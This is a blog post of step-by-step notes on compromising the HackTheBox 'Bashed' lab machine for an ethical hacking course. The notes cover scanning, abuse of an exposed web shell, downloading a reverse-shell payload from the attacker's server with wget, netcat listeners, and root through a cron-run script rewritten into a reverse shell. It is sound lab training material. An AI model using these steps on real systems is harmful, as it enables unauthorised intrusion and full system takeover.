---
layout:     post
title:      TCM PEH Hacking Bashed Notes
date:       2021-03-22
summary:    TheCyberMentor's Practical Ethical Hacking course mid-course capstone, hacking HackTheBox Bashed
categories: certs
thumbnail: cogs
tags:
 - certs
 - pwned
---
<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="HTB_Bashed_0"></a>HTB Bashed</h2>
<p class="has-line-data" data-line-start="1" data-line-end="2">Recording actions to derive method</p>
<p class="has-line-data" data-line-start="3" data-line-end="68">nmap -A -T4 -p- 10.10.10.68<br>
Noted open port 80<br>
Noted Apache 2.4.18<br>
Noted Ubuntu OS<br>
searchsploit apache 2.4<br>
Noted results apache2ctl local exploit<br>
Visited 10.10.10.68:80 in browser<br>
Naavigated around<br>
dirbuster&amp;<br>
<a href="http://10.10.10.68">http://10.10.10.68</a><br>
port 80<br>
go faster<br>
medium wordlist<br>
directories and file extensions<br>
extension php<br>
Letting dirbuster run<br>
Viewed source for a few pages, nothing unusual<br>
Dirbuster results<br>
Noted /uploads<br>
Noted /dev<br>
Noted /dev/phpbash<br>
Navigated to 10.10.10.68/dev/phpbash.php<br>
Noted that it’s a web shell<br>
ls<br>
cd /; ls<br>
ls /home<br>
whoami<br>
ls /home/<br>
cd arrexel<br>
cat user.txt<br>
sudo -l<br>
Noted can run scriptmanager with NOPASSWD<br>
sudo su scriptmanager<br>
Noted no tty present for user scriptmanager<br>
Changed IP and PORT<br>
Saved as rev.php<br>
Created netcat listener<br>
Created python http server from rev.php’s directory<br>
In webshell<br>
wget <a href="http://hisIP/rev.php">http://hisIP/rev.php</a><br>
ls<br>
Noted rev.php exists<br>
Navigated to /10.10.10.68/uploads/rev.php<br>
Noted shell connected<br>
Noted can’t access tty<br>
python -c ‘import pty; pty.spawn(&quot;/bin/bash&quot;);’<br>
sudo su scriptmanager<br>
Noted failed to switch user<br>
sudo -u scriptmanager /bin/bash<br>
Noted that we are now scriptmanager!<br>
pwd<br>
ls -la<br>
hsitory<br>
cd scripts<br>
ls -la<br>
Noted <a href="http://test.py">test.py</a> and test.txt<br>
cat <a href="http://test.py">test.py</a><br>
Noted it opens test.txt, writes to it, then closes it<br>
Noted that time ran was mere minutes ago<br>
Noted that means cronjob<br>
Noted it’s saving test.txt as root<br>
Copy/pasted python reverse shell into <a href="http://test.py">test.py</a> (<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>)<br>
Started new netcat listener<br>
Noted <a href="http://test.py">test.py</a> ran and netcat caught shell<br>
Noted shell user is root</p>